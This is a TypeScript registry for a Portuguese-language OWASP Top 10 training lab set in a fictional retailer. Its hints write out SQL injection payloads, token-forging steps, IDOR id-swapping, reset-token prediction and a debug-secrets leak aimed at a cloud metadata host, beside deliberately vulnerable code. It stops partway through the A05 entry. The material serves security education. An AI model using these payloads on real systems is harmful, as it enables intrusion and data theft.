/**
 * Registro central dos laboratorios OWASP Top 10 (2021).
 * Fonte unica de verdade: o backend valida flags a partir daqui e expoe os
 * metadados (sem o campo `flag`) para o frontend em GET /api/labs.
 *
 * Publico-alvo: DESENVOLVEDORES. Por isso cada writeup tem o par
 * `vulnerableCode` + `secureCode` e referencias tecnicas (OWASP/CWE/CVE).
 *
 * NARRATIVA (kill chain): todos os 10 labs sao subsistemas de UMA empresa
 * ficticia — a "Nexus Varejo S.A." — e formam um unico pentest black-box
 * encadeado. O achado de um passo alimenta o proximo. A ordem da intrusao
 * (campo killChain.step) e:
 *   A03(1) foothold -> A02(2) credencial -> A01(3) enumeracao -> A05(4) leak
 *   -> A07(5) privesc -> A04(6) takeover -> A06(7) pollution -> A10(8) pivot
 *   -> A08(9) RCE -> A09(10) cobertura de rastros.
 * Cada `context` abre com "Passo N da intrusao" para o dev nao se perder.
 *
 * REGRA DIDATICA: os exampleRequests sao BASELINES legitimos (sem o payload
 * pronto). Respostas 401/400/403/500 nesses baselines sao INTENCIONAIS — e a
 * API respondendo como um app real. O aluno precisa ADULTERAR a requisicao
 * para explorar; o payload so aparece nas dicas (opt-in) e no writeup.
 */

export interface LabReference {
  label: string;
  url: string;
}

export interface LabWriteup {
  rootCause: string;        // causa-raiz tecnica
  impact: string;           // impacto real no negocio
  vulnerableCode: string;   // trecho vulneravel (como o dev escreveu)
  vulnerableLanguage: string;
  secureCode: string;       // correcao (secure coding)
  secureLanguage: string;
  remediation: string[];    // checklist de correcao
}

export interface LabRequestExample {
  method: 'GET' | 'POST' | 'PUT' | 'DELETE';
  path: string;
  body?: string;
  note?: string;
  /** Endpoint protegido: o frontend injeta "Authorization: Bearer <token de sessao>". */
  auth?: boolean;
}

export interface LabKillChain {
  step: number;             // ordem sugerida na kill chain
  provides?: string;        // achado que este lab entrega para os proximos
  uses?: string;            // achado de um lab anterior que ajuda aqui
}

export interface LabDefinition {
  id: string;
  owaspId: string;          // A01..A10
  owaspTitle: string;
  killChain?: LabKillChain;
  title: string;
  difficulty: 'Iniciante' | 'Intermediario' | 'Avancado';
  points: number;
  cwe: string;
  tags: string[];
  tools?: string[];         // ferramentas destacadas no workbench (base64, jwt, node-serialize, url, crlf, proto, hash)
  primer?: string;          // "o que e esta vulnerabilidade" (didatico, no inicio do lab)
  objective: string;        // o que o aluno deve conseguir
  context: string;          // cenario corporativo (narrativa encadeada)
  baseEndpoint: string;     // endpoint alvo principal
  exampleRequests: LabRequestExample[];
  hints: string[];
  writeup: LabWriteup;
  references: LabReference[];
  flag: string;             // NAO exposto ao frontend
}

export const LABS: LabDefinition[] = [
  // ───────────────────────────── A01 ─────────────────────────────
  {
    id: 'a01-idor-invoices',
    owaspId: 'A01',
    owaspTitle: 'Broken Access Control',
    killChain: { step: 3, uses: 'Uma sessão válida de usuário comum — obtida no A03 (dump de credenciais) ou no A02 (token forjado).', provides: 'Mapa de dados: holerites e IDs de funcionários de toda a Nexus, incluindo a Diretoria. Insumo para reconhecimento dos próximos passos.' },
    title: 'IDOR no portal de holerites',
    difficulty: 'Iniciante',
    points: 100,
    cwe: 'CWE-639',
    tags: ['IDOR', 'BOLA', 'Access Control', 'API'],
    primer:
      'O QUE É IDOR (Insecure Direct Object Reference)? É quando a API expõe objetos diretamente por um identificador (id de usuário, nº de pedido, de fatura...) e NÃO verifica se quem pede é dono daquele objeto. O backend checa que você está logado, mas nunca pergunta: "este usuário autenticado é dono do id solicitado?". Trocando o identificador pelo de outra pessoa, você lê ou altera dados que não são seus. É a falha central do OWASP A01:2021 (Broken Access Control) e, em APIs, do item nº 1 — API1:2023 BOLA. CWE-639.\n\nPOR DEFINIÇÃO, um IDOR envolve DOIS usuários diferentes: um ATACANTE (a conta que você controla) e uma VÍTIMA (outro usuário cujo recurso você acessa sem permissão). Se a vítima tem o mesmo nível de privilégio que o atacante, é um IDOR HORIZONTAL; se for um usuário mais privilegiado, é VERTICAL.\n\nO TESTE CLÁSSICO (método da referência de C. Mangorima): 1) ache um endpoint com id no caminho, ex.: GET /users/{id}/profile; 2) veja se o id é previsível (inteiro sequencial); 3) peça o SEU recurso e depois TROQUE o id pelo de outro — se vier dado que não é seu, é IDOR; 4) teste LEITURA e ESCRITA. Procure padrões como /users/{id}, /orders/{id}, /invoices/{id}, /files/{id}, /tickets/{id}.\n\nO ponto central: AUTENTICAR (saber quem você é) não é AUTORIZAR (verificar se você pode acessar AQUELE objeto). A autorização tem de ser aplicada em TODO objeto, TODA vez. Impacto: leitura vaza PII, notas internas e segredos; escrita permite impersonação e fraude; tudo automatizável para colher muitos registros.\n\nReferências: C. Mangorima — "IDOR" (Medium) · OWASP A01:2021 · OWASP API Security Top 10 (API1 BOLA) · CWE-639 · PortSwigger Web Security Academy. Links na aba Referências.',
    objective:
      'Um IDOR se prova com DOIS usuários diferentes: um ATACANTE e uma VÍTIMA. Aqui você é o atacante "suporte_financeiro" (id 2, Analista Financeiro); a vítima é a colega "joana.rh" (id 4, Analista de RH) — mesmo nível de privilégio (IDOR horizontal). A tela de perfil chama GET /api/a01/users/2/profile — o id vai no CAMINHO. O servidor confere que você está logado, mas não que o perfil é seu. Faça o teste de troca de id: (1) LEITURA — GET /api/a01/users/4/profile devolve o perfil de joana.rh (nome, CPF, salário e a confidentialNote = flag); (2) ESCRITA — PUT /api/a01/users/4/profile altera o perfil dela. Você NUNCA teve a senha de joana — e mesmo assim leu e alterou os dados dela.',
    context:
      'Passo 3 da intrusão à Nexus Varejo S.A. — subsistema: Portal de RH & Benefícios. Com a sessão de "suporte_financeiro" (id 2) em mãos (vinda do A03/A02), você abre o seu perfil: a tela chama GET /api/a01/users/2/profile — o id vai no CAMINHO da URL. No mesmo portal está a colega joana.rh (id 4), do mesmo nível. Mesmo padrão do CVE-2026-53470 (migration-planner): o endpoint autentica o usuário, mas nunca confere se o perfil pedido pertence a ele.',
    baseEndpoint: 'GET /api/a01/users/:id/profile · PUT /api/a01/users/:id/profile',
    exampleRequests: [
      { method: 'POST', path: '/api/a01/login', body: '{"username":"suporte_financeiro","password":"123456"}', note: 'Baseline: faça login — a resposta traz seu token de sessão (user comum). Ele é capturado automaticamente.' },
      { method: 'GET', path: '/api/a01/users/2/profile', auth: true, note: 'Baseline (LEITURA): SEU perfil (id 2) — o confidentialNote aqui é a SUA nota, não a flag. O id vai no caminho da URL: nada impede trocá-lo pelo de outro.' },
      { method: 'PUT', path: '/api/a01/users/2/profile', body: '{"note":"atualizando meus dados"}', auth: true, note: 'Baseline (ESCRITA): altera o SEU perfil (id 2). Explore: troque o 2 no caminho pelo id de outra pessoa para alterar o registro DELA.' },
    ],
    hints: [
      'COMO EXPLORAR UM IDOR (metodologia das 2 contas, ref. Mangorima): você é o ATACANTE (id 2). 1) ache o endpoint com id (/users/{id}/profile); 2) veja se o id é previsível (inteiro sequencial — há funcionários nos ids 1 a 4); 3) faça o teste de troca: peça o SEU (id 2), depois troque pelo de OUTRO usuário e veja se vem dado que não é seu; 4) teste leitura E escrita.',
      'LEITURA: a vítima é a colega joana.rh, id 4. Em GET /api/a01/users/2/profile, troque o 2 por 4 → o servidor devolve o perfil de joana (nome, CPF, salário) e, no campo confidentialNote, o segredo.',
      'ESCRITA (impacto maior): em PUT /api/a01/users/2/profile, troque o 2 por 4 e envie {"note":"alterado por atacante"}. Você altera o perfil de joana.rh e o campo "profile" da resposta devolve o registro dela, com a confidentialNote (o segredo).',
    ],
    writeup: {
      rootCause:
        'A rota usa um identificador controlado pelo cliente (employeeId no parâmetro / :id no caminho) para buscar e ALTERAR o objeto, sem verificar se ele pertence a quem está autenticado. Autenticação existe, mas falta autorização em nível de objeto — é o Broken Object Level Authorization (BOLA) do OWASP API Security, variante direta do CWE-639 (User-Controlled Key).',
      impact:
        'Qualquer funcionário enumera os ids de perfil (1,2,3,4...) e LÊ salários, CPF e notas confidenciais de colegas do mesmo nível (IDOR horizontal) e também de superiores — e pior, ALTERA o registro de outros (IDOR de escrita), corrompendo dados. Violação direta de LGPD. Foi o que aconteceu no CVE-2026-53470 (CVSS 9.6): um usuário comum acessava artefatos de outros tenants por falta da checagem de dono. BOLA é a vulnerabilidade de API nº 1 por ser simples de cometer e invisível a testes que só olham "usuário logado vê a tela".',
      vulnerableLanguage: 'typescript',
      vulnerableCode: `// LEITURA: usa o id do CAMINHO sem checar de quem e o perfil (CWE-639)
router.get('/users/:id/profile', auth, (req, res) => {
  const profile = db.prepare('SELECT * FROM users WHERE id = ?')
                    .get(Number(req.params.id));
  res.json(profile);   // FALHA: nao checa req.params.id === req.user.id
});
// ESCRITA: idem no PUT — altera o perfil de QUALQUER um
router.put('/users/:id/profile', auth, (req, res) => {
  db.prepare('UPDATE profiles SET note = ? WHERE user_id = ?')
    .run(req.body.note, Number(req.params.id)); // FALHA: sem checar dono
  res.json({ updated: true });
});`,
      secureLanguage: 'typescript',
      secureCode: `// CORRECAO: autorizacao por OBJETO (ownership/RBAC) em leitura E escrita.
const canAccess = (req, id) => id === req.user.id || req.user.role === 'admin';

router.get('/users/:id/profile', auth, (req, res) => {
  const id = Number(req.params.id);
  if (!canAccess(req, id)) return res.status(403).json({ error: 'forbidden' });
  res.json(db.prepare('SELECT * FROM users WHERE id = ?').get(id));
});
router.put('/users/:id/profile', auth, (req, res) => {
  const id = Number(req.params.id);
  if (!canAccess(req, id)) return res.status(403).json({ error: 'forbidden' });
  db.prepare('UPDATE profiles SET note = ? WHERE user_id = ?').run(req.body.note, id);
  res.json({ updated: true });
});`,
      remediation: [
        'Derive o alvo do token (req.user.id) sempre que possível, em vez de aceitar um id do cliente.',
        'Quando o id vier do cliente, valide autorização em nível de OBJETO (ownership/RBAC) em TODA rota — leitura E escrita.',
        'Use identificadores não sequenciais (UUID v4) para dificultar enumeração — defesa em profundidade, não substitui a checagem.',
        'Adicione testes automatizados de autorização (usuário A não lê nem altera recurso de B) no CI.',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A01:2021 Broken Access Control', url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/' },
      { label: 'OWASP API Security Top 10 — API1 BOLA', url: 'https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/' },
      { label: 'Charmaine Mangorima — IDOR (Insecure Direct Object Reference), referência deste lab', url: 'https://medium.com/@charmainemangorima/idor-insecure-direct-object-reference-4e14445942e9' },
      { label: 'PortSwigger Web Security Academy — Access control & IDOR (laboratórios)', url: 'https://portswigger.net/web-security/access-control/idor' },
      { label: 'CWE-639: Authorization Bypass Through User-Controlled Key', url: 'https://cwe.mitre.org/data/definitions/639.html' },
      { label: 'Caso real (2026): CVE-2026-53470 — IDOR (CWE-639) no kubev2v migration-planner, usuário baixa artefatos de outros tenants (CVSS 9.6)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-53470' },
      { label: 'Caso real (2026): CVE-2026-23754 — D-Link D-View 8, usuário autenticado obtém credenciais de super admin (account takeover)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-23754' },
      { label: 'Caso real (2025): CVE-2025-13932 — IDOR na API SolisCloud via plant_id (CVSS 8.3)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-13932' },
    ],
    flag: 'CYBER{a01_broken_object_level_authorization}',
  },

  // ───────────────────────────── A02 ─────────────────────────────
  {
    id: 'a02-reversible-token',
    owaspId: 'A02',
    owaspTitle: 'Cryptographic Failures',
    killChain: { step: 2, uses: 'As credenciais do usuário comum "suporte_financeiro", recuperadas no dump do A03.', provides: 'A técnica de forjar um token sem integridade — você vai reusar exatamente esse raciocínio no A07 (JWT alg=none).' },
    title: 'Token de sessão reversível (Base64 não é cifra)',
    difficulty: 'Iniciante',
    points: 120,
    cwe: 'CWE-311',
    tags: ['Crypto Failure', 'Token', 'Base64', 'Integrity'],
    tools: ['base64'],
    primer:
      'O QUE É FALHA CRIPTOGRÁFICA (A02)? É proteger um dado com algo que NÃO é criptografia, ou usar cripto do jeito errado. O erro mais comum: confundir CODIFICAÇÃO (Base64, hex, URL-encode) com SEGURANÇA. Codificação é 100% reversível sem chave — serve para transportar bytes, nunca para esconder/proteger. Além disso, há duas garantias diferentes que as pessoas misturam: INTEGRIDADE (o dado não foi adulterado — obtida com assinatura/HMAC) e CONFIDENCIALIDADE (o dado não pode ser lido — obtida com cifra). Um token sem assinatura pode ser alterado por qualquer um; um "token" só em Base64 não tem nenhuma das duas.\n\nCOMO EXPLORAR: pegue o token, decodifique (atob/Base64), altere uma claim sensível (ex.: role), recodifique e reenvie. Se o servidor aceitar, não havia integridade.\n\nReferências: OWASP A02:2021 · CWE-311 (Missing Encryption) · CWE-326 (Inadequate Encryption Strength) · OWASP Session Management Cheat Sheet. Links na aba Referências.',
    objective:
      'O portal entrega, no login, um "token de sessão" que parece opaco mas é só Base64 de um JSON — sem assinatura nem cifra. Decodifique o token, troque sua role de "user" para "admin", recodifique e acesse /api/a02/account. Sucesso = a conta responder com o dado privilegiado que só um admin veria.',
    context:
      'Passo 2 da intrusão à Nexus — subsistema: autenticação do SSO interno. Você já tem as credenciais do "suporte_financeiro" (saíram do dump do A03). Ao logar, percebe que o token começa com "eyJ..." — cheira a algo decodificável. A verificação do /account confia na claim "role" sem nenhuma chave. É a lição central do A02: embaralhar/encodar NÃO é proteger. O mesmo erro conceitual aparece em larga escala no A07.',
    baseEndpoint: 'GET /api/a02/account',
    exampleRequests: [
      { method: 'POST', path: '/api/a02/login', body: '{"username":"suporte_financeiro","password":"123456"}', note: 'Baseline: autentique-se e observe o formato do token devolvido (ele é capturado automaticamente).' },
      { method: 'GET', path: '/api/a02/account', auth: true, note: 'Baseline: sua conta com role "user". Explore: adultere a role DENTRO do token e reenvie.' },
    ],
    hints: [
      'O token é só Base64 de um JSON. Decodifique (atob no console do navegador, ou um decoder Base64): você verá {"sub":"...","role":"user"}.',
      'Troque "role":"user" por "role":"admin" e recodifique em Base64url (btoa). Nenhuma chave é necessária — esse é o bug.',
      'Envie o token forjado em Authorization: Bearer <token> para GET /api/a02/account. O servidor acredita na role sem verificar integridade.',
    ],
    writeup: {
      rootCause:
        'O token de sessão é apenas Base64 de um JSON — codificação, não criptografia. Não há assinatura (integridade) nem cifra (confidencialidade). Qualquer um lê e altera as claims (ex.: role) e recodifica, porque nenhuma chave é necessária.',
      impact:
        'Escalonamento de privilégio trivial: qualquer usuário forja um token de admin em segundos, sem ferramenta especial. Quando o "token" ainda carrega PII em claro, vira também vazamento de dados. É a essência do A02 — e a falha gêmea do A07, onde o mesmo "confiar em dado não verificado" aparece num JWT. Pense em quantos sistemas internos tratam Base64 como se fosse segredo.',
      vulnerableLanguage: 'typescript',
      vulnerableCode: `// FALHA: "protege" a sessao so com Base64 (encoding != criptografia)
function makeSession(user) {
  return Buffer.from(JSON.stringify({ sub: user.username, role: user.role }))
               .toString('base64url'); // sem assinatura, sem cifra
}
// /account confia na role decodificada, sem verificar integridade
const claims = JSON.parse(Buffer.from(token, 'base64url').toString());
if (claims.role === 'admin') { /* acesso total */ }`,
      secureLanguage: 'typescript',
      secureCode: `// CORRECAO: token com INTEGRIDADE (assinatura) — ex.: JWT HS256/RS256
import jwt from 'jsonwebtoken';
const token = jwt.sign({ sub: user.username, role: user.role }, SECRET,
                       { algorithm: 'HS256', expiresIn: '15m' });
// verificacao rejeita qualquer adulteracao:
const claims = jwt.verify(token, SECRET, { algorithms: ['HS256'] });
// se precisar de CONFIDENCIALIDADE, use authenticated encryption (AES-256-GCM)
// ou, melhor ainda, sessao opaca no servidor (id aleatorio -> dados no backend).`,
      remediation: [
        'Nunca trate Base64/encoding como segurança: ele é reversível sem chave.',
        'Garanta INTEGRIDADE com assinatura (JWT assinado) ou sessão opaca server-side.',
        'Se o token carrega dados sensíveis, use authenticated encryption (AES-GCM), não cifra sem autenticação.',
        'Valide claims no servidor e nunca confie em role/privilégios vindos do cliente sem verificação criptográfica.',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A02:2021 Cryptographic Failures', url: 'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/' },
      { label: 'CWE-311: Missing Encryption of Sensitive Data', url: 'https://cwe.mitre.org/data/definitions/311.html' },
      { label: 'CWE-326: Inadequate Encryption Strength', url: 'https://cwe.mitre.org/data/definitions/326.html' },
      { label: 'OWASP Session Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html' },
    ],
    flag: 'CYBER{a02_encoding_is_not_encryption}',
  },

  // ───────────────────────────── A03 ─────────────────────────────
  {
    id: 'a03-sqli-login',
    owaspId: 'A03',
    owaspTitle: 'Injection',
    killChain: { step: 1, provides: 'Foothold da intrusão: dump da tabela users (usernames, roles, hashes MD5) via UNION e a apiKey de produção do admin. É daqui que saem as credenciais usadas no A02 e a sessão usada no A01.' },
    title: 'SQL Injection — bypass de autenticação e dump de dados',
    difficulty: 'Intermediario',
    points: 150,
    cwe: 'CWE-89',
    tags: ['SQLi', 'Injection', 'Auth Bypass'],
    tools: ['hash'],
    primer:
      'O QUE É INJECTION / SQL INJECTION (A03)? Acontece quando a entrada do usuário é misturada a um comando (SQL, shell, LDAP...) de forma que o interpretador deixa de distinguir DADO de CÓDIGO. Em SQLi, você concatena texto numa query e o atacante "fecha" a string e injeta sua própria lógica. A correção definitiva é SEMPRE separar dado de comando com queries parametrizadas (prepared statements) — não é escapar caractere por caractere, não é blacklist.\n\nCOMO EXPLORAR: insira um caractere de aspa (\') para quebrar a string e observe o erro; depois altere a lógica — bypass booleano (OR \'1\'=\'1\') para autenticar, ou UNION SELECT para exfiltrar outras colunas/tabelas (casando o nº de colunas).\n\nReferências: OWASP A03:2021 · CWE-89 · OWASP SQL Injection Prevention Cheat Sheet. Links na aba Referências.',
    objective:
      'Este é o ponto de entrada na Nexus. O login monta a query SQL por concatenação (4 colunas: id, username, password_md5, role). Faça um bypass booleano para entrar como admin E um UNION para dumpar a tabela de usuários. Sucesso = a resposta listar os usuários/hashes e revelar a credencial de produção do admin.',
    context:
      'Passo 1 — o começo de tudo. Alvo: o portal de vendas LEGADO da Nexus Varejo, ainda no ar e esquecido pelo time. O endpoint /api/a03/login concatena a entrada direto na SQL. Explorá-lo te dá o primeiro acesso e o material (credenciais + hashes) que alimenta o A02 e o A01. É o mesmo tipo de falha do CVE-2025-25257 (FortiWeb) e do CVE-2026-9082 (Drupal), ambos SQLi crítica em produtos amplamente usados em 2025/2026.',
    baseEndpoint: 'POST /api/a03/login',
    exampleRequests: [
      { method: 'POST', path: '/api/a03/login', body: `{"username":"admin","password":"senha123"}`, note: 'Baseline: tentativa de login normal (falha, você não tem a senha). Agora use o campo username para mudar a LÓGICA da query.' },
    ],
    hints: [
      'A query é: SELECT id, username, password_md5, role FROM users WHERE username = \'...\' AND password_md5 = \'...\'. São 4 colunas e a sua entrada entra crua entre aspas.',
      "Bypass booleano (entra como admin): username = admin' OR '1'='1' -- (o -- comenta a checagem de senha).",
      "Dump da tabela (UNION, mesmas 4 colunas) p/ extrair os hashes e a credencial do admin: username = x' UNION SELECT id, username, password_md5, role FROM users -- ",
    ],
    writeup: {
      rootCause:
        'A aplicação constrói a query SQL por concatenação de strings com entrada do usuário. O interpretador SQL não distingue dados de comando → o atacante reescreve a lógica da query.',
      impact:
        'Bypass de autenticação, extração de dados (UNION-based), escrita/destruição de dados e, em alguns SGBDs, execução de comandos no SO. No CVE-2025-25257 (FortiWeb, CVSS 9.8) a SQLi pré-auth no Fabric Connector foi encadeada até RCE via INTO OUTFILE; o CVE-2026-9082 (Drupal core, SA-CORE-2026-004) foi alvo de exploração em massa dias após o anúncio. Injection segue no Top 10 há mais de 20 anos porque a concatenação continua tentadora.',
      vulnerableLanguage: 'typescript',
      vulnerableCode: `const sql = "SELECT * FROM users WHERE username = '" + username +
            "' AND password_md5 = '" + md5(password) + "'";
const user = db.prepare(sql).get(); // concatenacao = injetavel`,
      secureLanguage: 'typescript',
      secureCode: `// CORRECAO: prepared statement parametrizado (dados != comando)
const user = db.prepare(
  'SELECT * FROM users WHERE username = ? AND password_md5 = ?'
).get(username, md5(password));`,
      remediation: [
        'Use sempre queries parametrizadas / prepared statements; nunca concatene entrada.',
        'Prefira ORMs/query builders que parametrizam por padrão (Prisma, Drizzle, Knex).',
        'Aplique validação de input (allowlist) e menor privilégio na conta do banco.',
        'Adote WAF + testes DAST como defesa em profundidade (não substituem a parametrização).',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A03:2021 Injection', url: 'https://owasp.org/Top10/A03_2021-Injection/' },
      { label: 'OWASP SQL Injection Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
      { label: 'CWE-89: SQL Injection', url: 'https://cwe.mitre.org/data/definitions/89.html' },
      { label: 'Caso real (2026, CISA KEV, exploração ativa): CVE-2026-9082 — SQLi no Drupal Core, PostgreSQL (SA-CORE-2026-004)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2026-9082' },
      { label: 'Caso real (2025, PoC público → RCE): CVE-2025-25257 — SQLi pré-auth no Fortinet FortiWeb Fabric Connector (CVSS 9.8)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-25257' },
      { label: 'Caso real (2025): CVE-2025-1094 — SQLi no PostgreSQL via quoting inválido, encadeada a RCE (CVSS 8.1)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-1094' },
    ],
    flag: 'CYBER{a03_sqli_auth_bypass_parametrize_everything}',
  },

  // ───────────────────────────── A04 ─────────────────────────────
  {
    id: 'a04-insecure-reset',
    owaspId: 'A04',
    owaspTitle: 'Insecure Design',
    killChain: { step: 6, uses: 'O conhecimento de quais contas administrativas existem (enumeradas no A01/A03).', provides: 'Account takeover definitivo do admin: você redefine a senha dele sem nunca ter acesso ao e-mail.' },
    title: 'Reset de senha com token previsível',
    difficulty: 'Avancado',
    points: 200,
    cwe: 'CWE-640',
    tags: ['Insecure Design', 'Password Reset', 'Predictable Token'],
    primer:
      'O QUE É INSECURE DESIGN (A04)? É uma falha na CONCEPÇÃO do controle, não um bug pontual de implementação. Mesmo com o código "escrito certo", o desenho é inseguro — faltou pensar nos abusos na fase de projeto (threat modeling / abuse cases). Exemplo clássico: um fluxo de "esqueci a senha" cujo token de recuperação é previsível (deriva do tempo, de um contador, ou tem pouca entropia). Nenhum patch de linha única resolve: é preciso REPROJETAR o fluxo (token de CSPRNG, hash armazenado, expiração curta, uso único, rate-limit).\n\nCOMO EXPLORAR: descubra de onde o token é derivado. Se for o relógio do servidor, obtenha esse relógio (ex.: um endpoint /server-time) e PREVEJA o token da vítima dentro da janela aceita.\n\nReferências: OWASP A04:2021 · CWE-640 (Weak Password Recovery) · OWASP Forgot Password Cheat Sheet. Links na aba Referências.',
    objective:
      'O fluxo de "esqueci minha senha" gera o token de recuperação a partir do próprio relógio do servidor (segundo epoch) — zero aleatoriedade. Dispare o reset do admin, confirme no log de auditoria do gateway de e-mail que o link FOI enviado (mas o token vem mascarado — você nunca teria acesso a ele por aí), descubra o relógio do servidor e preveja o token para redefinir a senha dele. Sucesso = a conta do admin ser tomada e revelar o dado de recuperação.',
    context:
      'Passo 6 — consolidando o controle. Já com visão de admin, você quer posse PERMANENTE da conta da Diretoria, independente de token forjado. Analisando o fluxo de recuperação da Nexus, descobre uma falha de DESIGN (não um bug pontual): o token de reset é derivado do horário do servidor, e o endpoint /server-time entrega esse relógio de bandeja. O log de auditoria do gateway de e-mail confirma que a mensagem foi enviada, mas o conteúdo com o link vem mascarado — nem a Nexus consegue ler o próprio token depois de enviado. Previsibilidade de token de reset é um clássico de "Insecure Design" — o controle já nasceu quebrado na prancheta.',
    baseEndpoint: 'POST /api/a04/reset',
    exampleRequests: [
      { method: 'POST', path: '/api/a04/forgot', body: '{"username":"admin"}', note: 'Baseline: dispara o fluxo de recuperação do admin e registra o envio do e-mail.' },
      { method: 'GET', path: '/api/a04/mailbox/admin', note: 'Log de auditoria do gateway de e-mail: confirma que a mensagem foi enviada (destinatário, assunto, horário), mas o link/token vem mascarado — nem esse log interno guarda o segredo em claro.' },
      { method: 'GET', path: '/api/a04/server-time', note: 'Revela o relógio do servidor (epochSeconds) — a base previsível do token.' },
      { method: 'POST', path: '/api/a04/reset', body: '{"username":"admin","token":"PREVISTO","newPassword":"Hacked#1"}', note: 'Baseline: substitua "PREVISTO" pelo epochSeconds que você obteve no /server-time.' },
    ],
    hints: [
      'O e-mail de reset existe de verdade (confira em GET /api/a04/mailbox/admin após o /forgot) — mas o token vem mascarado por DLP. Ler o e-mail não é o caminho; prever o token é.',
      'O token de reset é simplesmente o segundo epoch atual do servidor — não há hash, sal nem aleatoriedade. O design é o bug.',
      'Faça GET /api/a04/server-time e use o valor de epochSeconds como token (a API aceita uma pequena janela de tempo).',
      'Envie POST /api/a04/reset com {"username":"admin","token":<epochSeconds>,"newPassword":"..."}.',
    ],
    writeup: {
      rootCause:
        'Falha de DESIGN (não de implementação pontual): o token de reset deriva de uma fonte previsível e de baixa entropia (tempo). O controle de segurança foi mal concebido na prancheta — nenhum "corretivo de código" o salva sem repensar o fluxo.',
      impact:
        'Account takeover de qualquer conta, incluindo admin, sem acesso ao e-mail da vítima. Tokens de reset fracos/adivinháveis continuam aparecendo em produtos reais (ex.: CVE-2022-29174 no Countly) e são a porta de entrada preferida para sequestro de conta. "Insecure Design" entrou no Top 10 de 2021 justamente para capturar falhas que nascem antes da primeira linha de código.',
      vulnerableLanguage: 'typescript',
      vulnerableCode: `function makeResetToken() {
  // FALHA DE DESIGN: o token E o relogio do servidor (previsivel, baixa entropia)
  return String(Math.floor(Date.now() / 1000));
}
// /reset aceita qualquer token dentro de uma janela de tempo -> adivinhavel`,
      secureLanguage: 'typescript',
      secureCode: `import crypto from 'node:crypto';
function makeResetToken() {
  // 256 bits de entropia de CSPRNG, com expiracao curta e uso unico
  return crypto.randomBytes(32).toString('base64url');
}
// armazenar hash do token + expires_at (<=15min) + single-use;
// invalidar apos uso; rate-limit por conta/IP.`,
      remediation: [
        'Gere tokens com CSPRNG (crypto.randomBytes), ≥128 bits de entropia.',
        'Armazene apenas o HASH do token, com expiração curta e uso único.',
        'Rate-limit e lockout no fluxo de reset; não revele se o usuário existe.',
        'Faça threat modeling do fluxo na fase de design (OWASP SAMM / abuse cases).',
      ],
    } as LabWriteup,
    references: [
      { label: 'OWASP A04:2021 Insecure Design', url: 'https://owasp.org/Top10/A04_2021-Insecure_Design/' },
      { label: 'OWASP Forgot Password Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html' },
      { label: 'CWE-640: Weak Password Recovery Mechanism', url: 'https://cwe.mitre.org/data/definitions/640.html' },
      { label: 'Caso real: CVE-2022-29174 — token de reset adivinhável (Countly)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-29174' },
    ],
    flag: 'CYBER{a04_predictable_reset_token_is_a_design_flaw}',
  },

  // ───────────────────────────── A05 ─────────────────────────────
  {
    id: 'a05-misconfig-debug',
    owaspId: 'A05',
    owaspTitle: 'Security Misconfiguration',
    killChain: { step: 4, uses: 'Acesso autenticado à aplicação (dos passos anteriores) para alcançar as rotas internas.', provides: 'Dois segredos de ouro: o JWT_SECRET (→ assina token admin VÁLIDO no A07) e o host de metadados 169.254.169.254 (→ alvo do SSRF no A10).' },
    title: 'Endpoint de debug exposto em produção',
    difficulty: 'Iniciante',
    points: 120,
    cwe: 'CWE-16',
    tags: ['Misconfiguration', 'Debug', 'Information Disclosure'],
    primer:
      'O QUE É SECURITY MISCONFIGURATION (A05)? É a segurança comprometida por CONFIGURAÇÃO, não por código: defaults inseguros, recursos de diagnóstico/debug ligados em produção, mensagens de erro verbosas, headers ausentes, segredos em variáveis de ambiente expostas, buckets/portas abertas. Raramente é "a" falha fatal sozinha — mas costuma ser o ACELERADOR que entrega segredos e detalhes internos para encadear as outras.\n\nCOMO EXPLORAR: procure rotas de diagnóstico esquecidas (/debug, /actuator, /_status, /env) e leia erros verbosos em busca de pistas de rotas internas. O prêmio costuma ser um dump de configuração/segredos.\n\nReferências: OWASP A05:2021 · CWE-16 (Configuration) · CWE-215 (Sensitive Info in Debug). Links na aba Referências.',
    objective:
      'Um endpoint de diagnóstico ficou ligado em produção e despeja as variáveis de ambiente. O índice do serviço lista as rotas internas — siga a pista até o endpoint de debug e leia o dump. Sucesso = capturar o APP_SECRET exposto — e, de brinde, anotar o JWT_SECRET e o host de metadados que vão destravar o A07 e o A10.',
    context:
      'Passo 4 — o pulo do gato. A Nexus fez um deploy apressado: ficou com NODE_ENV fora de "production" e um /debug/env ativo e SEM autenticação. Esse dump é o nó que amarra toda a kill chain: dele saem o JWT_SECRET (que transforma o A07 de "truque alg=none" em assinatura legítima de admin) e o endereço do serviço de metadados da nuvem (o alvo do SSRF no A10). Mesma classe do CVE-2024-7569 (Ivanti ITSM), em que um endpoint de debug vazou o client secret OIDC.',
    baseEndpoint: 'GET /api/a05/debug/env',
    exampleRequests: [
      { method: 'GET', path: '/api/a05/', note: 'Baseline: o índice do serviço (200) lista as rotas internas — inclusive uma de diagnóstico que não deveria estar exposta em produção. Siga a pista.' },
    ],
    hints: [
      'Rotas de diagnóstico (/debug, /actuator, /_status) costumam escapar para produção. A pista está no índice do serviço (GET /api/a05/), que lista as rotas internas.',
      'A flag está na variável APP_SECRET do dump de GET /api/a05/debug/env.',
      '[KILL CHAIN] O mesmo dump vaza JWT_SECRET (guarde p/ assinar um token admin VÁLIDO no A07) e AWS_METADATA_HOST (o 169.254.169.254 que você vai atacar no A10).',
    ],
    writeup: {
      rootCause:
